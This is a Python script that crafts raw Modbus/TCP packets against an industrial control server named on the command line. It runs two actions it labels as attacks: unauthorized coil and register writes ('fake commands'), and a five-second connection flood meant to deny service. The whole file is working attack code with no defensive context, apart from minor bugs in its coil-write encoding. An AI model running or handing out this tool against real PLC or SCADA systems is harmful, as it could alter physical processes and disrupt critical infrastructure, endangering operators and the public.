import socket
import random
import sys
import time
SERVER_IP = sys.argv[1]
SERVER_PORT = 502
#start = time.time()
class MB():
    
    UNIT_ID = 1
    FNCODE_READ_DISCRETE_INPUTS = 2
    FNCODE_READ_COILS = 1
    FNCODE_WRITE_SINGLE_COIL = 5
    FNCODE_WRITE_MULTIPLE_COILS = 15
    FNCODE_READ_INPUT_REGISTERS = 4
    FNCODE_READ_MULTIPLE_HOLDING_REGISTERS = 3
    FNCODE_WRITE_SINGLE_HOLDING_REGISTER = 6
    FNCODE_WRITE_MULTIPLE_HOLDING_REGISTERS = 16
    
    WRITE_SINGLE_COIL_OFF = 0
    WRITE_SINGLE_COIL_ON = 0xFF00

class MBPkt():

    transaction_number = random.randint(0, 0xFFFF)
    
    def __init__(self, fn_code, data):
        self.tn = MBPkt.transaction_number
        self.fn = fn_code
        self.data = data
        MBPkt.transaction_number = (MBPkt.transaction_number + 1) % 0xFFFF
       
       
    def recv(self, sock, recv_buf):
        while True:
            msg = sock.recv(6 - len(recv_buf))
            if len(msg) == 0:
                print("No reply")
                break
            recv_buf.extend(msg)
            if len(recv_buf) == 6: break
        l = int.from_bytes(recv_buf[4:6], byteorder='big', signed=False) + 6
        while True:
            msg = sock.recv(l - len(recv_buf))
            if len(msg) == 0:
                print("No reply")
                break
            recv_buf.extend(msg)
            #print("%d bytes needed," % l, "%d bytes buffered" % len(recv_buf))
            if len(recv_buf) == l: break
    
    def send(self, sock=None):
        
        if sock is None:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
        else:
            s = sock                
    
        b = bytearray(8)
        b[0:2] = self.tn.to_bytes(2, byteorder='big', signed=False)
        b[4:6] = (len(self.data) + 2).to_bytes(2, byteorder='big', signed=False)
        b[6] = MB.UNIT_ID
        b[7] = self.fn
        b = b + self.data
        i = 0 
        while i < len(b):
            i += s.send(b[i:])
        
        # Wait for the reply
        recv_buf = bytearray()
        try:
            self.recv(s, recv_buf)
            if sock is None: 
                s.shutdown(socket.SHUT_RDWR)
            #time = time.time() - start
            #print("time:" + str(time * 1000) + "ms")
            print("Reply received.")
        except OSError as err:
            print("Failed:", err)
        if sock is None:
            s.close()

    def flood(self, sock=None):
        time_ref = time.time()
        while (time.time() < time_ref + 5):
            #let the query run for 5 seconds
            if sock is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((SERVER_IP, SERVER_PORT))
            else:
                s = sock                
        
            b = bytearray(8)
            b[0:2] = self.tn.to_bytes(2, byteorder='big', signed=False)
            b[4:6] = (len(self.data) + 2).to_bytes(2, byteorder='big', signed=False)
            b[6] = MB.UNIT_ID
            b[7] = self.fn
            b = b + self.data
            i = 0 
            print("sending query")
            while i < len(b):
                i += s.send(b[i:])
        
        # # Wait for the reply
        # recv_buf = bytearray()
        # try:
        #     self.recv(s, recv_buf)
        #     if sock is None: 
        #         s.shutdown(socket.SHUT_RDWR)
        #     #time = time.time() - start
        #     #print("time:" + str(time * 1000) + "ms")
        #     print("Reply received.")
        # except OSError as err:
        #     print("Failed:", err)
        # if sock is None:
        #     s.close()     
    @staticmethod
    def ReadCoils(start, count):
        b = bytearray(4)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_READ_COILS, b)
        
    @staticmethod
    def ReadDiscreteInputs(start, count):
        b = bytearray(4)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_READ_DISCRETE_INPUTS, b)
        
    @staticmethod
    def ReadHoldingMultiple(start, count):
        b = bytearray(4)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_READ_MULTIPLE_HOLDING_REGISTERS, b)
        
    @staticmethod
    def ReadInputs(start, count):
        b = bytearray(4)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_READ_INPUT_REGISTERS, b)
        
    @staticmethod
    def WriteCoilSingle(addr, on):
        b = bytearray(4)
        b[0:2] = addr.to_bytes(2, byteorder='big', signed=False)
        if on:
            b[2:4] = MB.WRITE_SINGLE_COIL_ON.to_bytes(2, byteorder='big', signed=False)
        else:
            b[2:4] = MB.WRITE_SINGLE_COIL_ON.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_WRITE_SINGLE_COIL, b)
        
    @staticmethod
    def WriteCoilMultiple(start, values):
        count = len(values)
        size = ((count - 1) // 8) + 1
        b = bytearray(5 + size)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        b[4] = count
        for i in range(count):
            if values[i]:
                byte_index = 5 + i//8
                bit_index = i % 8 
                b[byte_index] |= 1 << bit_index
        return MBPkt(MB.FNCODE_WRITE_MULTIPLE_COILS, b)
        
    @staticmethod
    def WriteHoldingSingle(addr, val):
        b = bytearray(4)
        b[0:2] = addr.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = val.to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_WRITE_SINGLE_HOLDING_REGISTER, b)
        
    @staticmethod
    def WriteHoldingMultiple(start, values):
        count = len(values)
        b = bytearray(5 + count*2)
        b[0:2] = start.to_bytes(2, byteorder='big', signed=False)
        b[2:4] = count.to_bytes(2, byteorder='big', signed=False)
        b[4] = count * 2
        for i in range(count):
            b[i*2+5:i*2+7] = values[i].to_bytes(2, byteorder='big', signed=False)
        return MBPkt(MB.FNCODE_WRITE_MULTIPLE_HOLDING_REGISTERS, b)

#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#print("Connecting to %s..." % SERVER_IP)
#s.connect((SERVER_IP, SERVER_PORT))

# EDIT BELOW!
# This is the send loop
def send_fake_commands():
    for i in range(1, 4):
        print("Sending Read Input Registers...")
        P = MBPkt.ReadInputs(0, 1).send()
        print("Sending Write Single Coil...")
        P = MBPkt.WriteCoilSingle(2, True).send()
        print("Sending Write Multiple Coils...")
        P = MBPkt.WriteCoilMultiple(i, [j%2==0 for j in range(i)]).send()
        print("Sending Write Single Holding Register...")
        P = MBPkt.WriteHoldingSingle(i, i).send()
        print("Sending Write Multiple Holding Registers...")
        P = MBPkt.WriteHoldingMultiple(i, list(range(i))).send()

    
    
print("Attack 1 - Send fake command: write_coil from client....")
send_fake_commands()
print("Attack 2 - query flooding")
P = MBPkt.ReadHoldingMultiple(8, 4).flood()
#s.shutdown(socket.SHUT_RDWR)
#s.close()
